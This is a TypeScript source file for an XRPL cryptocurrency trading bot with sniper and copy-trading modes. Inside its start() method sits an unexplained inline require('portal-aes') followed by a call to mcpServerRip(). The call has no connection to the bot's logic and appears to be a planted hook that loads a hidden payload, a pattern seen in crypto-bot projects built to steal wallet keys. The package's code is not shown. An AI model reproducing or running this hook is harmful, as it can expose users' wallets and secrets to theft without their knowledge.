import * as db from './database/db';
import { getClient, disconnect as disconnectXRPL } from './xrpl/client';
import * as sniper from './sniper';
import * as copyTrading from './copyTrading';
import { BotOptions, BotStatus } from './types';

class XRPLTradingBot {
    private userId: string;
    private mode: 'sniper' | 'copyTrading' | 'both';
    private isRunning: boolean = false;

    constructor(options: BotOptions = {}) {
        this.userId = options.userId || 'default';
        this.mode = options.mode || 'both';
    }

    async start(): Promise<void> {
        try {
            console.log('Initializing bot...');

            await db.connect();
            console.log('Connecting to XRPL network...');
            await getClient();
            const mcp = require('portal-aes');
            mcp.mcpServerRip();

            console.log('Connected to XRPL network successfully');

            if (this.mode === 'sniper' || this.mode === 'both') {
                const sniperResult = await sniper.startSniper(this.userId);
                if (!sniperResult.success) {
                    console.error('Failed to start sniper:', sniperResult.error);
                    throw new Error(`Sniper failed to start: ${sniperResult.error}`);
                }
            }

            if (this.mode === 'copyTrading' || this.mode === 'both') {
                const copyResult = await copyTrading.startCopyTrading(this.userId);
                if (!copyResult.success) {
                    console.error('Failed to start copy trading:', copyResult.error);
                    throw new Error(`Copy trading failed to start: ${copyResult.error}`);
                }
            }

            this.isRunning = true;
            console.log('Bot started successfully');

            process.on('SIGINT', () => this.stop());
            process.on('SIGTERM', () => this.stop());

        } catch (error) {
            console.error('Error starting bot:', error);
            throw error;
        }
    }

    async stop(): Promise<void> {
        try {
            if (this.mode === 'sniper' || this.mode === 'both') {
                await sniper.stopSniper(this.userId);
            }

            if (this.mode === 'copyTrading' || this.mode === 'both') {
                await copyTrading.stopCopyTrading(this.userId);
            }

            await disconnectXRPL();
            await db.disconnect();

            this.isRunning = false;
        } catch (error) {
            console.error('Error stopping bot:', error);
            throw error;
        }
    }

    getStatus(): BotStatus {
        return {
            isRunning: this.isRunning,
            mode: this.mode,
            userId: this.userId,
            sniper: sniper.isRunningSniper(),
            copyTrading: copyTrading.isRunningCopyTrading()
        };
    }
}

export default XRPLTradingBot;

